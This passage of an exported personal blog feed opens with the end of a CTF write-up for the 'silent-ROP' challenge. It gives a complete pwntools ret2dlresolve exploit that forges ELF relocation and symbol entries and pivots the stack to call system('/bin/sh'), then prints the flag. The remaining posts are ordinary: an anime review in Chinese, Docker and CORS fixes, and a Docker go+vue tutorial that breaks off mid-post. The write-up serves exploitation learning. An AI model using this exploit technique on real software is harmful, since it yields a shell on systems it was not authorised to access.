class="string">&#x27;&#x27;&#x27;Start the exploit against the target.&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> args.GDB:</span><br><span class="line">        <span class="keyword">return</span> gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> process([exe.path] + argv, *a, **kw)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Specify your GDB script here for debugging</span></span><br><span class="line"><span class="comment"># GDB will be launched if the exploit is run via e.g.</span></span><br><span class="line"><span class="comment"># ./exploit.py GDB</span></span><br><span class="line">gdbscript = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">tbreak main</span></span><br><span class="line"><span class="string">continue</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(**<span class="built_in">locals</span>())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ===========================================================</span></span><br><span class="line"><span class="comment">#                    EXPLOIT GOES HERE</span></span><br><span class="line"><span class="comment"># ===========================================================</span></span><br><span class="line"><span class="comment"># Arch:     i386-32-little</span></span><br><span class="line"><span class="comment"># RELRO:    Partial RELRO</span></span><br><span class="line"><span class="comment"># Stack:    No canary found</span></span><br><span class="line"><span class="comment"># NX:       NX enabled</span></span><br><span class="line"><span class="comment"># PIE:      No PIE (0x8048000)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x08048000 - 0x08049000 - usr     4K s r-- /home/aynakeya/ctf/k3rn3lctf2021/silent-rop/silent-ROP /home/aynakeya/ctf/k3rn3lctf2021/silent-rop/silent-ROP ; segment.ehdr</span></span><br><span class="line"><span class="comment"># 0x08049000 - 0x0804a000 - usr     4K s r-x /home/aynakeya/ctf/k3rn3lctf2021/silent-rop/silent-ROP /home/aynakeya/ctf/k3rn3lctf2021/silent-rop/silent-ROP ; map._home_aynakeya_ctf_k3rn3lctf2021_silent_rop_silent_ROP.r_x</span></span><br><span class="line"><span class="comment"># 0x0804a000 - 0x0804b000 - usr     4K s r-- /home/aynakeya/ctf/k3rn3lctf2021/silent-rop/silent-ROP /home/aynakeya/ctf/k3rn3lctf2021/silent-rop/silent-ROP ; obj._fp_hw</span></span><br><span class="line"><span class="comment"># 0x0804b000 - 0x0804c000 - usr     4K s r-- /home/aynakeya/ctf/k3rn3lctf2021/silent-rop/silent-ROP /home/aynakeya/ctf/k3rn3lctf2021/silent-rop/silent-ROP ; map._home_aynakeya_ctf_k3rn3lctf2021_silent_rop_silent_ROP.r__</span></span><br><span class="line"><span class="comment"># 0x0804c000 - 0x0804d000 - usr     4K s rw- /home/aynakeya/ctf/k3rn3lctf2021/silent-rop/silent-ROP /home/aynakeya/ctf/k3rn3lctf2021/silent-rop/silent-ROP ; map._home_aynakeya_ctf_k3rn3lctf2021_silent_rop_silent_ROP.rw_</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># [0xf7ef7120]&gt; px @ 0x8048248</span></span><br><span class="line"><span class="comment"># - offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF</span></span><br><span class="line"><span class="comment"># 0x08048248  0000 0000 0000 0000 0000 0000 0000 0000  ................</span></span><br><span class="line"><span class="comment"># 0x08048258  2000 0000 0000 0000 0000 0000 1200 0000   ...............</span></span><br><span class="line"><span class="comment"># 0x08048268  5000 0000 0000 0000 0000 0000 2000 0000  P........... ...</span></span><br><span class="line"><span class="comment"># 0x08048278  3400 0000 0000 0000 0000 0000 1200 0000  4...............</span></span><br><span class="line"><span class="comment"># 0x08048288  1a00 0000 0000 0000 0000 0000 1100 0000  ................</span></span><br><span class="line"><span class="comment"># 0x08048298  2c00 0000 0000 0000 0000 0000 1200 0000  ,...............</span></span><br><span class="line"><span class="comment"># 0x080482a8  2500 0000 0000 0000 0000 0000 1100 0000  %...............</span></span><br><span class="line"><span class="comment"># 0x080482b8  0b00 0000 04a0 0408 0400 0000 1100 1100  ................</span></span><br><span class="line"><span class="comment"># 0x080482c8  006c 6962 632e 736f 2e36 005f 494f 5f73  .libc.so.6._IO_s</span></span><br><span class="line"><span class="comment"># 0x080482d8  7464 696e 5f75 7365 6400 7374 6469 6e00  tdin_used.stdin.</span></span><br><span class="line"><span class="comment"># 0x080482e8  7265 6164 0073 7464 6f75 7400 7365 7476  read.stdout.setv</span></span><br><span class="line"><span class="comment"># 0x080482f8  6275 6600 5f5f 6c69 6263 5f73 7461 7274  buf.__libc_start</span></span><br><span class="line"><span class="comment"># 0x08048308  5f6d 6169 6e00 474c 4942 435f 322e 3000  _main.GLIBC_2.0.</span></span><br><span class="line"><span class="comment"># 0x08048318  5f5f 676d 6f6e 5f73 7461 7274 5f5f 0000  __gmon_start__..</span></span><br><span class="line"><span class="comment"># 0x08048328  0000 0200 0000 0200 0200 0200 0200 0100  ................</span></span><br><span class="line"><span class="comment"># 0x08048338  0100 0100 0100 0000 1000 0000 0000 0000  ................</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">log_print</span>(<span class="params">*msg</span>):</span><br><span class="line">    log.info(<span class="string">&quot; &quot;</span>.join(msg))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">int2byte</span>(<span class="params">x: <span class="built_in">int</span></span>):</span><br><span class="line">    <span class="keyword">return</span> x.to_bytes(<span class="number">0x4</span>, <span class="string">&quot;little&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># at the beginning of .plt</span></span><br><span class="line">dl_resolve_ptr = exe.get_section_by_name(<span class="string">&quot;.plt&quot;</span>)[<span class="string">&quot;sh_addr&quot;</span>]</span><br><span class="line">log_print(<span class="string">&quot;dl_resolve:&quot;</span>, <span class="built_in">hex</span>(dl_resolve_ptr))</span><br><span class="line"></span><br><span class="line">section_dynstr, section_dynsym, section_rel_plt = <span class="built_in">map</span>(exe.dynamic_value_by_tag,</span><br><span class="line">                                                      [<span class="string">&quot;DT_STRTAB&quot;</span>, <span class="string">&quot;DT_SYMTAB&quot;</span>, <span class="string">&quot;DT_JMPREL&quot;</span>])</span><br><span class="line"></span><br><span class="line">log_print(<span class="string">&quot;.dynstr:&quot;</span>, <span class="built_in">hex</span>(section_dynstr))</span><br><span class="line">log_print(<span class="string">&quot;.dynsym:&quot;</span>, <span class="built_in">hex</span>(section_dynsym))</span><br><span class="line">log_print(<span class="string">&quot;.rel.plt:&quot;</span>, <span class="built_in">hex</span>(section_rel_plt))</span><br><span class="line"></span><br><span class="line">writable_ptr = <span class="number">0x0804d000</span> - <span class="number">0x400</span></span><br><span class="line">fake_stack_address = writable_ptr</span><br><span class="line">rop_offset = <span class="number">0x0</span></span><br><span class="line">fake_rel_plt_offset = <span class="number">0x140</span></span><br><span class="line">fake_dynsym_offset = <span class="number">0x160</span> + section_dynsym % <span class="number">0x10</span>  <span class="comment"># align to 0x10 multiplication + section_dynsym</span></span><br><span class="line">fake_dynstr_offset = <span class="number">0x190</span></span><br><span class="line">fake_got_offset = <span class="number">0x1e0</span></span><br><span class="line">fake_text_offset = <span class="number">0x1f0</span></span><br><span class="line">fake_stack_length = <span class="number">0x300</span></span><br><span class="line"><span class="comment"># fake section.text</span></span><br><span class="line">fake_text = <span class="string">b&quot;/bin/sh\x00&quot;</span></span><br><span class="line"><span class="comment"># fake section.dynstr</span></span><br><span class="line">fake_dynstr = <span class="string">b&quot;system\x00&quot;</span></span><br><span class="line"><span class="comment"># fake section.dynsym</span></span><br><span class="line">fake_dynsym = flat(&#123;</span><br><span class="line">    <span class="number">0x0</span>: (writable_ptr + fake_dynstr_offset) - section_dynstr,  <span class="comment"># system\x00 offset to section.dynstr</span></span><br><span class="line">    <span class="number">0xc</span>: <span class="number">0x12</span>  <span class="comment"># just copy paste from origin section.dynsym</span></span><br><span class="line">&#125;, filler=<span class="string">b&quot;\x00&quot;</span>, length=<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">fake_sym_index = (writable_ptr + fake_dynsym_offset - section_dynsym) // <span class="number">0x10</span></span><br><span class="line">log_print(<span class="built_in">hex</span>(fake_sym_index))</span><br><span class="line">r_info = (fake_sym_index &lt;&lt; <span class="number">8</span>) | <span class="number">0x7</span></span><br><span class="line">log_print(<span class="built_in">hex</span>(r_info))</span><br><span class="line">fake_rel_plt = flat(&#123;</span><br><span class="line">    <span class="number">0x0</span>: writable_ptr + fake_got_offset,</span><br><span class="line">    <span class="number">0x4</span>: r_info,</span><br><span class="line">&#125;, filler=<span class="string">b&quot;\x00&quot;</span>, length=<span class="number">0x8</span>)</span><br><span class="line"></span><br><span class="line">call_dl_resolve = flat(&#123;</span><br><span class="line">    <span class="number">0x0</span>: [</span><br><span class="line">        <span class="string">b&quot;AAAA&quot;</span>, <span class="comment"># fake ebp</span></span><br><span class="line">        dl_resolve_ptr,</span><br><span class="line">        (writable_ptr + fake_rel_plt_offset) - section_rel_plt,  <span class="comment"># section.rel.plt function offset</span></span><br><span class="line">        <span class="string">b&quot;AAAA&quot;</span>,</span><br><span class="line">        writable_ptr + fake_text_offset</span><br><span class="line">    ]</span><br><span class="line">&#125;)</span><br><span class="line">log_print(<span class="built_in">hex</span>((writable_ptr + fake_rel_plt_offset)), <span class="built_in">hex</span>(section_rel_plt),<span class="built_in">hex</span>((writable_ptr + fake_rel_plt_offset) - section_rel_plt))</span><br><span class="line"></span><br><span class="line">fake_call_system_stack = flat(&#123;</span><br><span class="line">    rop_offset: call_dl_resolve,</span><br><span class="line">    fake_rel_plt_offset: fake_rel_plt,</span><br><span class="line">    fake_dynsym_offset: fake_dynsym,</span><br><span class="line">    fake_dynstr_offset: fake_dynstr,</span><br><span class="line">    fake_text_offset: fake_text,</span><br><span class="line">&#125;,filler=<span class="string">b&quot;\x00&quot;</span>,length=fake_stack_length)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x0804c100</span></span><br><span class="line"><span class="string">AAAA &lt;- fake ebp</span></span><br><span class="line"><span class="string">// we want to fake that system call dl_resolve</span></span><br><span class="line"><span class="string">// push fake section.rel.plt</span></span><br><span class="line"><span class="string">dl_resolve</span></span><br><span class="line"><span class="string">fake_rel_plt_ptr</span></span><br><span class="line"><span class="string">-</span></span><br><span class="line"><span class="string">AAAA &lt;- fake eip</span></span><br><span class="line"><span class="string">&quot;/bin/sh&quot; ptr &lt;- parameter 1</span></span><br><span class="line"><span class="string">// some fake stack where it call system(&quot;/bin/sh&quot;)</span></span><br><span class="line"><span class="string">-</span></span><br><span class="line"><span class="string">// fake section.rel.plt</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">   Elf32_Addr r_offset ; /* Address */  Fake got</span></span><br><span class="line"><span class="string">   Elf32_Word r_info ; /* Relocation type and symbol index */  point to fake section.dynsym</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">// fake section.dynsym</span></span><br><span class="line"><span class="string">point to &quot;system&quot; in fake section.dynstr</span></span><br><span class="line"><span class="string">// fake section.dynstr</span></span><br><span class="line"><span class="string">&quot;system&quot;</span></span><br><span class="line"><span class="string">// fake got</span></span><br><span class="line"><span class="string">// fake text</span></span><br><span class="line"><span class="string">&quot;/bin/sh&quot;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">jump_to_call_system_stack = flat(&#123;</span><br><span class="line">    <span class="number">0x18</span>: [</span><br><span class="line">        fake_stack_address, <span class="comment"># ebp</span></span><br><span class="line">        exe.plt[<span class="string">&#x27;read&#x27;</span>], <span class="comment"># call read to write stack into the target</span></span><br><span class="line">        rop.find_gadget([<span class="string">&#x27;leave&#x27;</span>, <span class="string">&#x27;ret&#x27;</span>])[<span class="number">0</span>],</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        fake_stack_address,</span><br><span class="line">        fake_stack_length,</span><br><span class="line">        ],</span><br><span class="line">    &#125;, filler=<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">origin</span></span><br><span class="line"><span class="string">saved ebp</span></span><br><span class="line"><span class="string">save eip</span></span><br><span class="line"><span class="string">stack of main</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">we want to fake the main to call read(0,fake_stack_address,0x300),</span></span><br><span class="line"><span class="string">fake_stack_address &lt;- saved ebp</span></span><br><span class="line"><span class="string">jmp read &lt;- </span></span><br><span class="line"><span class="string">leave;ret; &lt;- saved eip. but we want to first point esp to the our stack and then ret so we can execute dl_resolve</span></span><br><span class="line"><span class="string">0x0 &lt;- para 1</span></span><br><span class="line"><span class="string">fake_stack_address &lt;- para 2</span></span><br><span class="line"><span class="string">fake_stack_length=0x300 &lt; para 3</span></span><br><span class="line"><span class="string">main</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">input</span>(<span class="string">&quot;debugger?&quot;</span>) == <span class="string">&quot;y\n&quot;</span>:</span><br><span class="line">    pid = util.proc.pidof(io)[<span class="number">0</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;The pid is: &quot;</span> + <span class="built_in">str</span>(pid))</span><br><span class="line">    util.proc.wait_for_debugger(pid)</span><br><span class="line">    <span class="built_in">input</span>(<span class="string">&quot;press enter to continue&quot;</span>)</span><br><span class="line"><span class="built_in">input</span>(<span class="string">&quot;send first payload&quot;</span>)</span><br><span class="line">io.sendline(jump_to_call_system_stack)</span><br><span class="line"><span class="built_in">input</span>(<span class="string">&quot;send second payload&quot;</span>)</span><br><span class="line">io.sendline(fake_call_system_stack)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="0x6-Flag"><a href="#0x6-Flag" class="headerlink" title="0x6 Flag"></a>0x6 Flag</h1><p>flag{r3t_2_dl_r3s0lve_d03s_n0t_n3ed_a_l34k}</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>writeup</tag>
        <tag>ret2dlresolve</tag>
      </tags>
  </entry>
  <entry>
    <title>数据火葬场~~~</title>
    <url>/articles/shu-ju-huo-zang-chang/</url>
    <content><![CDATA[<p>喵喵咪的，vps提供商断电了，博客全没了</p>
]]></content>
  </entry>
  <entry>
    <title>自制新插件添加~</title>
    <url>/articles/zi-zhi-cha-jian-tian-jia/</url>
    <content><![CDATA[<p>大概自己做了一个小插件</p>
<p>目前可以换背景和添加网易云歌单~</p>
<p>插件已经装上啦~</p>
<span id="more"></span>

<p>github地址: <a href="https://github.com/LXG-Shadow/hexo-background-plus">https://github.com/LXG-Shadow/hexo-background-plus</a></p>
<p><strong>安装方式</strong></p>
<ol>
<li><code>cd node_modules</code></li>
<li><code>git clone https://github.com/LXG-Shadow/hexo-background-plus</code></li>
<li>打开package.json,<br> 在dependencies中添加<code>&quot;hexo-background-plus&quot;:&quot;^0.0.1&quot;</code></li>
</ol>
]]></content>
  </entry>
  <entry>
    <title>[动漫碎碎念] 简评2022年七月番</title>
    <url>/articles/animation/jian-ping-2022-nian-qi-yue-fan/</url>
    <content><![CDATA[<p>七月，本来计划着在暑假里多看点动漫的我，挑挑选选，最后还是只看了两部原创动漫，<strong>《Lycoris Recoil》</strong>和<strong>《Engage Kiss》</strong>。</p>
<span id="more"></span>

<p>先来说说《Lycoris Recoil》（以下简称为<em>LR</em>），先来个个人的总评吧，6.5&#x2F;10还挺可以的。</p>
<p>我看这个动漫的初衷是为了看美少女枪战，美少女+<strong>枪战</strong>，试问还有什么能比这个更加吸引我的呢？不管怎么样，动漫里的枪战确实是我看这个动漫最为期待的东西。</p>
<p><em>LR</em>的前几集中，确实有令人惊艳的枪战戏。制作公司在做枪战场面的时候确实用足了心思，抛开女主能躲子弹的超能力不谈，不论是对枪械的刻画，还是对人物在枪战中的战术动作等，都做到尽善尽美，把好钢用在了刀刃上。这个时候我还有点感慨，制作公司还是懂的啊。</p>
<p>可惜，随后<em>LR</em>就变成了以单元剧形式开展的美少女贴贴动画，简单来说就是百合向。虽然我本人并不排斥这类动画，也不对百合豚这个群体有任何的偏见（叠甲），总感觉这个百合向的剧情未免有点喧宾夺主了。就举个例子来说，sakana这个剧情完全和我对不上电波。我的评价是，你想刻画泷奈和千束的感情变化可以，但能不能稍微契合一点主题，不要嗯整一个水族馆来推动剧情。就比如，<em>LR</em>在描写泷奈重回DA并在千束的鼓励下于自己和解这段剧情，虽然感觉百合的部分稍微有点用力过猛，但是总体来说还是契合主题，符合逻辑的。（加一句，千束在DA的枪战戏真的是太好看了，真的真的太好看了）</p>
<p>后面的剧情就更加离谱了。首先是这个剧情中过于离谱的黑客技术，这个可以说是夸张的表现手法，可以理解，但是双方黑客的能力实在是太不匹配了。一边的DA好歹也是一个有好多人的大组织，但是DA的技术和主角团，甚至和反派的技术比起来，仿佛一个还处于中世纪，一个已经成四维生物了。更别说在之后的剧情里，地区里都出现枪战了，路人A都已经目击了枪战现场，这个时候放个影片说是活动，人们还真都信了？</p>
<p>有些人说看个故事就别去考虑真实性了。确实，看故事的确实不需要讲究他在现实中的真实性，但是我认为一个故事至少要在这个故事所设定的世界观下讲究逻辑，在它自己的世界观下讲究真实性。如果不，那不就是把自己的设定给吃掉了么</p>
<p>跟可惜的是，剧情最后慢慢走向了大谈特谈程序正义&#x2F;结果正义，以及个人意志的问题。想讲的东西太多，但可惜编剧的能力不支持他讲好这两个主题，所以就观感来说不是很好。</p>
<p>总之，到后来我对这部番的期待就仅仅只是看动漫里的枪战戏了，不得不说，确实非常好看。</p>
<p>再来说说《Engage Kiss》（以下简称<em>EK</em>）</p>
<p>讲真，一开始我确实没打算看这部动漫。因为个人非常不喜欢带有什么三角恋，后宫，前任&#x2F;现任的剧情。但是这部动漫的相关切片一直在我的主页里出现，并且这个反转再反转的剧情真真实实有点吸引到我了，我最终还是决定看一看。</p>
<p>我对这部动漫的感情线一点都不关心，主要是男主这个脚踏多条船，吃软饭的性格不怎么令人喜欢。但不得不说的是，编剧在处理反转这个地方做的实在是太好了。从给观众一个印象，再在之后用一个反转推翻这个印象。从一开始的一团迷雾，到最后慢慢的接近真相。就像是一个推理小说，让观众能够随着主角的视角一步一步了解真相，这个感觉确实非常不错。</p>
<p>我本想举几个例子来支撑我的观点的，但是想了想，这部动漫的剧情基本就是在反转中前行的，实在是太多了，我就不多说了。懂得自然懂，看过的一般也懂。</p>
<p>总的来说，7.5&#x2F;10。这个评分完全是剧情给的，至于感情线这块，是属于负分的。（rnm怎么找女朋友啊我好烦啊</p>
<p>忘了说了，<em>LR</em>和<em>EK</em>的画面都没有问题，经费十分充足，不需要在这一块担心。</p>
<p>最后再来提一嘴<strong>《赛博朋克：边缘行者》</strong>，我已经从各处听说了这部番有多么的好看，基本上也云完了这个动漫的剧情。但我始终不敢自己去看。原因也很简单，不知道为什么，最近总是特别容易被情绪影响，我不想看这种悲剧故事再给自己加压了。</p>
<p>那么差不多就这样了，希望十月能够有更多好看的动漫吧。</p>
<p>2022.10.01<br>Aynakeya</p>
]]></content>
      <categories>
        <category>Anime</category>
      </categories>
      <tags>
        <tag>lycoris recoil</tag>
        <tag>engage kiss</tag>
        <tag>动漫碎碎念</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker Desktop setting won&#39;t open in windows 10</title>
    <url>/articles/coding/docker-desktop-setting-won-t-open-in-windows-10/</url>
    <content><![CDATA[<p>If you stuck on the setting menu.</p>
<p>try to use</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd &quot;C:\Program Files\Docker\Docker&quot;</span><br><span class="line"></span><br><span class="line">./DockerCli.exe -SwitchDaemon</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Coding</category>
      </categories>
      <tags>
        <tag>windows</tag>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>Axio使用withCredentials后跨域请求出现错误</title>
    <url>/articles/coding/axio-shi-yong-withcredentials-hou-kua-yu-qing-qiu-chu-xian-cuo-wu/</url>
    <content><![CDATA[<p>在前后端分离的项目里，因为前端和后端不在一个域上，所以为了在使用跨域请求带上cookie，要把withCredentials设置为true</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">axios.defaults.withCredentials = true</span><br></pre></td></tr></table></figure>

<p>但是设置完之后，访问又出现了如下的问题</p>
<p>Response to preflight request doesn&#39;t pass access control check: The value of the &#39;Access-Control-Allow-Origin&#39; header in the response must not be the wildcard &#39;*&#39; when the request&#39;s credentials mode is &#39;include&#39;. Origin &#39;<a href="http://localhost:8080/">http://localhost:8080</a>&#39; is therefore not allowed access. The credentials mode of requests initiated by the XMLHttpRequest is controlled by the withCredentials attribute.</p>
<span id="more"></span>

<p>解决方案</p>
<ul>
<li>设置<code>Access-Control-Allow-Origin</code>字段为指定域名，不能为<code>*</code></li>
<li>设置<code>Access-Control-Allow-Credentials</code>设置为true</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">corsconfig := cors.DefaultConfig()</span><br><span class="line">corsconfig.AllowOrigins = []string&#123;&quot;http://localhost:3000&quot;&#125;</span><br><span class="line">corsconfig.AllowCredentials = true</span><br><span class="line">engine.Use(cors.New(corsconfig))</span><br></pre></td></tr></table></figure>

<p>reference: <a href="https://www.cnblogs.com/cnxkey/articles/14259716.html">https://www.cnblogs.com/cnxkey/articles/14259716.html</a></p>
]]></content>
      <categories>
        <category>Coding</category>
      </categories>
      <tags>
        <tag>vue</tag>
        <tag>full stack</tag>
        <tag>cors</tag>
      </tags>
  </entry>
  <entry>
    <title>【Docker】用Docker构建一个前后端分离的项目 (go+vue)</title>
    <url>/articles/coding/built-go-gin-backend-and-vue-spa-frontend-with-docker/</url>
    <content><![CDATA[<h1 id="0x0-前言"><a href="#0x0-前言" class="headerlink" title="0x0 前言"></a>0x0 前言</h1><p>最近给自己的一个后端项目<a href="https://github.com/aynakeya/AynaAPI">AynaAPI</a>做了一个前端。因为是用vue写的，而且使用了vue-router, 所以直接用go-gin渲染前端不太好用，而且也不太符合前后端分离的理念。</p>
<p>反正忽略上面的理由，不管怎么样，总之来说我就是想用用看docker，顺便学习一下docker要如何使用。</p>
<p>但是问题还是有的，但是感觉前言写这么多是不是不太好，啊呀也无所谓了，总之网络上没多少关于如何用docker构建前后端分离项目的教程，或许是我没找到，或者就是屁用没有的教程，总之反正都不是很好用。</p>
<p>总之在这篇文章里我要简略的介绍一下我都后端项目以及前端项目以及如何使用docker+docker-compose来构建项目</p>
<span id="more"></span>

<h1 id="0x1-项目简介"><a href="#0x1-项目简介" class="headerlink" title="0x1 项目简介"></a>0x1 项目简介</h1><p>项目主要分为两部分，前端，以及后端(这不是废话么，笑了)</p>
<p>总之，前端就是一个简单的SPA单页应用</p>
<ul>
<li>用了 vue + vue-router</li>
<li>ajax 请求后端获取数据</li>
</ul>
<p>然后，后端就是单纯的api，不包含任何的前端渲染</p>
<ul>
<li>go-gin 作为后端</li>
<li>所有api都以 &#x2F;api开头</li>
<li>后端有一个上传文件的功能，上传的文件保存在&#x2F;static下</li>
<li>后端依赖redis</li>
</ul>
<h1 id="0x2-服务端-后端-Dockerfile"><a href="#0x2-服务端-后端-Dockerfile" class="headerlink" title="0x2 服务端(后端) Dockerfile"></a>0x2 服务端(后端) Dockerfile</h1><p>后端的结构如图</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AynaAPI</span><br><span class="line">--config</span><br><span class="line">--...</span><br><span class="line">--server</span><br><span class="line">----main</span><br><span class="line">------main.go</span><br><span class="line">--go.mod</span><br><span class="line">--Dockerfile</span><br></pre></td></tr></table></figure>

<p>总之服务器在&#x2F;server&#x2F;main&#x2F;main.go下，build的时候使用命令<code>go build /server/main/main.go</code></p>
<p>我们把Dockerfile建立在项目的根目录下，然后写入以下的文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 使用 golang:alpine作为编译使用的容器, 并且将其命名为build</span><br><span class="line">FROM golang:alpine as build</span><br><span class="line"></span><br><span class="line"># 安装gcc等其他编译工具</span><br><span class="line">RUN apk add build-base</span><br><span class="line"></span><br><span class="line"># 如果在国内用goproxy</span><br><span class="line">#ENV GOPROXY https://goproxy.cn,direct</span><br><span class="line"></span><br><span class="line"># 设定一个工作目录</span><br><span class="line">WORKDIR /go/src/github.com/aynakeya/AynaAPI</span><br><span class="line"></span><br><span class="line"># 复制当前文件夹下所有文件到工作目录中</span><br><span class="line">COPY . .</span><br><span class="line"></span><br><span class="line"># 编译服务端</span><br><span class="line">RUN go generate &amp;&amp; go env &amp;&amp; go build -o ayapi ./server/main</span><br><span class="line"></span><br><span class="line"># ===========================================================</span><br><span class="line"># 多阶段构建运行服务端</span><br><span class="line"></span><br><span class="line"># 因为是在alpine里构建的, 所以同样使用alpine镜像作为运行的容器</span><br><span class="line">FROM alpine:latest</span><br><span class="line"></span><br><span class="line"># 维护者, 写不写无所谓的</span><br><span class="line">LABEL MAINTAINER=&quot;aynakeya@aynakeya.com&quot;</span><br><span class="line"></span><br><span class="line"># 设定一个工作目录</span><br><span class="line">WORKDIR /go/src/github.com/aynakeya/AynaAPI</span><br><span class="line"></span><br><span class="line"># 从上一个容器build中复制所有的代码包含可执行文件到当前的工作目录</span><br><span class="line">COPY --from=build /go/src/github.com/aynakeya/AynaAPI ./</span><br><span class="line"></span><br><span class="line"># 暴露端口</span><br><span class="line">EXPOSE 8080</span><br><span class="line"></span><br><span class="line"># 启动服务端</span><br><span class="line">ENTRYPOINT ./ayapi -c=conf/conf_docker.ini</span><br></pre></td></tr></table></figure>

<p>大概就是这样，首先用golang:alpine编译整个服务端程序，然后把程序以及项目复制到alpine:latest里来运行。这些不难理解。</p>
<p>但是后端依赖redis，而且alpine这个镜像里没有，所以我们需要使用另外一个容器来运行redis，这个时候我们就需要对我们的配置文件做一点小小的修改。把原来的localhost也就是127.0.0.1改为177.7.0.12，至于为啥要改成这个，等等就知道了。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[Redis]</span><br><span class="line">;Host = 127.0.0.1:6379</span><br><span class="line">Host = 177.7.0.12:6379</span><br><span class="line">Password =</span><br><span class="line">MaxIdle = 30</span><br><span class="line">MaxActive = 30</span><br><span class="line">IdleTimeout = 200</span><br></pre></td></tr></table></figure>

<p>完成了所有的设置之后我们就可以运行一下，试试看有没有任何错误。注意在构建镜像的时候这个**.**一定要加上。</p>
<p>如果一切顺利的话你就能在localhost:8080上看见你的后端程序了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd AynaAPI</span><br><span class="line">// 构建镜像, backend 为镜像名字</span><br><span class="line">docker build -t backend:v0.1 .</span><br><span class="line">// 运行</span><br><span class="line">docker run -it -p &quot;8080:8080&quot; --rm backend:v0.1</span><br></pre></td></tr></table></figure>

<p>可以看见已经运行成功了，但是redis是没有连上的。</p>
<p><img data-src="/images/coding/built-go-gin-backend-and-vue-spa-frontend-with-docker/2022-01-09_002735.jpg" alt="2022-01-09_002735.jpg"></p>
<h1 id="0x3-前端-Dockerfile"><a href="#0x3-前端-Dockerfile" class="headerlink" title="0x3 前端 Dockerfile"></a>0x3 前端 Dockerfile</h1><p>前端的结构如图</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AynaAPI-Frontend</span><br><span class="line">--src</span><br><span class="line">--index.html</span><br><span class="line">--nginx_docker.conf</span><br><span class="line">--package.json</span><br><span class="line">--Dockerfile</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>同样先来看看Dockerfile怎么写</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 声明镜像来源为node:12.16.1，命名为build</span><br><span class="line">FROM node:12.18.3 as build</span><br><span class="line"></span><br><span class="line"># 声明工作目录</span><br><span class="line">WORKDIR /aynaapi_fronend/</span><br><span class="line"></span><br><span class="line"># 拷贝整个前端项目到当前工作目录</span><br><span class="line">COPY . .</span><br><span class="line"></span><br><span class="line"># 安装所有的依赖</span><br><span class="line">RUN npm install</span><br><span class="line"></span><br><span class="line"># 打包项目，生成的文件保存在./dist下</span><br><span class="line">RUN npm run build</span><br><span class="line"></span><br><span class="line"># ===========================================================</span><br><span class="line"># 多阶段构建</span><br><span class="line"></span><br><span class="line">#使用nginx</span><br><span class="line">FROM nginx:alpine</span><br><span class="line"></span><br><span class="line">LABEL MAINTAINER = &quot;aynakeya@aynakeya.com&quot;</span><br><span class="line"></span><br><span class="line"># 暴露8000端口</span><br><span class="line">EXPOSE 8000</span><br><span class="line"></span><br><span class="line"># 复制打包好的文件到nginx的www目录下</span><br><span class="line">COPY --from=build /aynaapi_fronend/dist /usr/share/nginx/html</span><br><span class="line"># 把nginx的默认配置改成我们自己的</span><br><span class="line">COPY --from=build /aynaapi_fronend/nginx_docker.conf /etc/nginx/conf.d/default.conf</span><br></pre></td></tr></table></figure>

<p>总之打包文件那部分还是比较好理解的，主要说一下正式运行的部分。这里使用nginx来处理请求，同样使用了alpine的版本来减少最终镜像的大小。然后来看一看我们自己的nginx配置。</p>
<p>首先listen 8000不难理解，就纯粹开放一下8000端口。</p>
<p>接下来做了两个转发，第一是把访问&#x2F;api的所有请求转发到177.7.0.11:8080,也就是后端的地址，至于为啥是177.7.0.11之后会说。这个rewrite 就是把 &#x2F;api 重写成&#x2F;api，相当于没变。这边暂时没用我只是写着，万一那天有用呢。第二个是把所有访问&#x2F;static的也转发到后端。</p>
